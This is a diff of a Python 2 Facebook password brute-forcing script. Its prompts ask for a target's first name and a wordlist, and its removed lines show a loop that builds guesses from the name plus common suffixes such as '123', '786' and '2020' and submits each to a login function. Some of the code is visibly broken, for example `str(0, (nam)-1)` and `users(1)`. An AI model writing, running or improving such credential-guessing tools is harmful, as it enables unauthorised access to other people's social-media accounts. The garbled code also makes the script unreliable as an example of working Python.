@@ -12,6 +12,7 @@ firstname = []
 id = []
 listpass = []
 username = []
+nam = []
 
 ##### LOGO #####
 logo = """\033[1;93m_/﹋\_          
@@ -24,20 +25,11 @@ logo = """\033[1;93m_/﹋\_
 \033[1;31m╚════════════════════════════════════════╝\033[0m"""
 
 
-nam = ["khan", "Chowdhury", "Mahmood"]
-
-def random_fullname():
-    for i in range(0,50):
-         lastname = str(0, (nam)-1)
-         print(firstname  + " " + lastname)
-
-
 os.system('clear')
 print logo
 print
 print 42*"\033[1;96m="
 firstname = str(raw_input("\033[1;96m[+] \033[1;93mNama Depan FB \033[1;97m: "))
-random_fullname()
 passwordlist = str(raw_input("\033[1;96m[+] \033[1;93mWordlist \033[1;97m: "))
 
 
@@ -80,28 +72,6 @@ def brute(password):
 			
 def search():
 	global password
-	for user in username:
-		users = user.split('|')		
-		ss = users[0].split(' ')
-		for x in ss:
-			listpass = [
-				str(firstname) + '123',
-				str(firstname) + '786',
-				str(firstname) + '12345',
-				str(firstname) + '@123',
-				str(firstname) + '12',
-				str(firstname) + '123456',
-  				str(firstname) + '1234',
-				str(firstname) + '121',
-				str(firstname) + '001',
-				str(firstname) + '111',
-				str(firstname) + '2020',
-				str(firstname) + '10',
-				str(firstname)
-				]
-			listpass.append(passwordlist)
- 			for passw in set(listpass):
-				ex.submit(login,(users(1)),(passw))
 
 		
 #welcome 
